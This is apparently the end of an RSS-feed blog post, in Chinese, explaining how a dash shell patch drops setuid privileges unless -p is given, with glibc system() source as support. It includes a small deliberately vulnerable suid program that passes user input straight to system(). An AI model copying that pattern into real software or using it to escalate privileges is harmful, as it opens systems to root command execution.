&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">@@&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>,&lt;span style="color:#ae81ff">11&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">97&lt;/span>,&lt;span style="color:#ae81ff">16&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@@&lt;/span> main(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv)
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> jmploc jmploc;
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> stackmark smark;
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> login;
&lt;span style="color:#f92672">++&lt;/span> uid_t uid;
&lt;span style="color:#f92672">++&lt;/span> gid_t gid;
&lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">#&lt;/span>ifdef __GLIBC__
&lt;span style="color:#f92672">+&lt;/span> dash_errno &lt;span style="color:#f92672">=&lt;/span> __errno_location();
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">#&lt;/span>endif
&lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#f92672">++&lt;/span> uid &lt;span style="color:#f92672">=&lt;/span> getuid();
&lt;span style="color:#f92672">++&lt;/span> gid &lt;span style="color:#f92672">=&lt;/span> getgid();
&lt;span style="color:#f92672">+&lt;/span>diff &lt;span style="color:#f92672">-&lt;/span>Naurp dash&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0.5.7&lt;/span>.ori&lt;span style="color:#f92672">/&lt;/span>src&lt;span style="color:#f92672">/&lt;/span>priv.c dash&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0.5.7&lt;/span>&lt;span style="color:#f92672">/&lt;/span>src&lt;span style="color:#f92672">/&lt;/span>priv.c
&lt;span style="color:#f92672">+---&lt;/span> dash&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0.5.7&lt;/span>.ori&lt;span style="color:#f92672">/&lt;/span>src&lt;span style="color:#f92672">/&lt;/span>priv.c &lt;span style="color:#ae81ff">1969&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">31&lt;/span> &lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">00.000000000&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0500&lt;/span>
&lt;span style="color:#f92672">++++&lt;/span> dash&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0.5.7&lt;/span>&lt;span style="color:#f92672">/&lt;/span>src&lt;span style="color:#f92672">/&lt;/span>priv.c &lt;span style="color:#ae81ff">2015&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">06&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">03&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">31.097386153&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0400&lt;/span>
&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">@@&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">27&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@@&lt;/span>
&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span>include &lt;span style="color:#f92672">&amp;lt;&lt;/span>unistd.h&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;span style="color:#f92672">++&lt;/span>
&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span>include &lt;span style="color:#e6db74">&amp;#34;priv.h&amp;#34;&lt;/span>
&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span>include &lt;span style="color:#e6db74">&amp;#34;var.h&amp;#34;&lt;/span>
&lt;span style="color:#f92672">++&lt;/span>
&lt;span style="color:#f92672">++&lt;/span>uid_t uid;
&lt;span style="color:#f92672">++&lt;/span>gid_t gid;
&lt;span style="color:#f92672">++&lt;/span>
&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> setprivileged(&lt;span style="color:#66d9ef">int&lt;/span> on)
&lt;span style="color:#f92672">++&lt;/span>{
&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> is_privileged &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (is_privileged &lt;span style="color:#f92672">==&lt;/span> on)
&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span>;
&lt;span style="color:#f92672">++&lt;/span>
&lt;span style="color:#f92672">++&lt;/span> is_privileged &lt;span style="color:#f92672">=&lt;/span> on;
&lt;span style="color:#f92672">++&lt;/span>
&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e">++ * To limit bogus system(3) or popen(3) calls in setuid binaries, require
&lt;/span>&lt;span style="color:#75715e">++ * -p flag to work in this situation.
&lt;/span>&lt;span style="color:#75715e">++ */&lt;/span>
&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>on &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (uid &lt;span style="color:#f92672">!=&lt;/span> geteuid() &lt;span style="color:#f92672">||&lt;/span> gid &lt;span style="color:#f92672">!=&lt;/span> getegid())) {
&lt;span style="color:#f92672">++&lt;/span> setuid(uid);
&lt;span style="color:#f92672">++&lt;/span> setgid(gid);
&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#75715e">/* PS1 might need to be changed accordingly. */&lt;/span>
&lt;span style="color:#f92672">++&lt;/span> choose_ps1();
&lt;span style="color:#f92672">++&lt;/span> }
&lt;span style="color:#f92672">++&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>那么为什么要这样实现呢？为什么如果需要继承默认的effective user ID和effective group ID需要显式的使用-p参数呢？
假设我们有如下suid程序，并且该程序由www-data用户启动：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>argv[]) {
printf(&lt;span style="color:#e6db74">&amp;#34;%s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, argv[&lt;span style="color:#ae81ff">1&lt;/span>]);
&lt;span style="color:#66d9ef">return&lt;/span> system(argv[&lt;span style="color:#ae81ff">1&lt;/span>]);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中通过system函数执行用户传入的命令，system实现可以
&lt;a href="https://codebrowser.dev/glibc/glibc/sysdeps/posix/system.c.html" target="_blank">在这找到&lt;/a>，可以看到实际执行的是&lt;code>/bin/sh -c command&lt;/code>，加入攻击者传入恶意命令，尝试通过该程序以root权限执行命令，最终以&lt;code>/bin/sh -c command&lt;/code>的形式执行命令。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#define SHELL_PATH &amp;#34;/bin/sh&amp;#34; &lt;/span>&lt;span style="color:#75715e">/* Path of the shell. */&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#define SHELL_NAME &amp;#34;sh&amp;#34; &lt;/span>&lt;span style="color:#75715e">/* Name to give it. */&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>do_system (&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>line)
{
&lt;span style="color:#66d9ef">int&lt;/span> status &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;span style="color:#66d9ef">int&lt;/span> ret;
pid_t pid;
&lt;span style="color:#66d9ef">struct&lt;/span> sigaction sa;
&lt;span style="color:#75715e">#ifndef _LIBC_REENTRANT
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> sigaction intr, quit;
&lt;span style="color:#75715e">#endif
&lt;/span>&lt;span style="color:#75715e">&lt;/span> .....
__posix_spawnattr_init (&lt;span style="color:#f92672">&amp;amp;&lt;/span>spawn_attr);
__posix_spawnattr_setsigmask (&lt;span style="color:#f92672">&amp;amp;&lt;/span>spawn_attr, &lt;span style="color:#f92672">&amp;amp;&lt;/span>omask);
__posix_spawnattr_setsigdefault (&lt;span style="color:#f92672">&amp;amp;&lt;/span>spawn_attr, &lt;span style="color:#f92672">&amp;amp;&lt;/span>reset);
__posix_spawnattr_setflags (&lt;span style="color:#f92672">&amp;amp;&lt;/span>spawn_attr,
POSIX_SPAWN_SETSIGDEF &lt;span style="color:#f92672">|&lt;/span> POSIX_SPAWN_SETSIGMASK);
ret &lt;span style="color:#f92672">=&lt;/span> __posix_spawn (&lt;span style="color:#f92672">&amp;amp;&lt;/span>pid, SHELL_PATH, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>spawn_attr,
(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span>[]){ (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>) SHELL_NAME,
(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>) &lt;span style="color:#e6db74">&amp;#34;-c&amp;#34;&lt;/span>,
(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>) line, NULL },
__environ);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果没有前面说的措施，那么攻击者可以成功以root权限执行恶意命令，但通过上面的措施，则会出现如下：因为进程的rid为www-data，eid为root，而通过system函数执行命令不能显式设置-p参数，导致在执行命令时，不能通过if判断，命令的权限会被降为www-data权限，从而一定程度上缓解了攻击。&lt;/p>
&lt;p>参考资料&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" target="_blank">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-12-08T10:30:07+08:00&lt;/strong>&lt;/p></description></item></channel></rss>